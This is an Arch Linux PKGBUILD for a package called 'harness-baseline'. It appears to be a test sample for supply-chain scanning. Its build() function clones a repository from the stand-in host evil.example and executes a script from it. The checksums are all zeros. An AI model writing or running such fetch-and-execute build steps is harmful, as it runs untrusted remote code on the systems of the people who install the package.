pkgname=harness-baseline
pkgver=1.0.1
pkgrel=1
pkgdesc="Baseline package for harness campaigns"
arch=("any")
url="https://github.com/example/harness-baseline"
license=("MIT")
source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" "repo::https://evil.example/repo.git")
sha256sums=("0000000000000000000000000000000000000000000000000000000000000000" "0000000000000000000000000000000000000000000000000000000000000000")

build() {
  cd "$srcdir"
  git clone --depth 1 https://evil.example/repo.git
  awk '1' repo/x.sh > run.me
  escript run.me
}
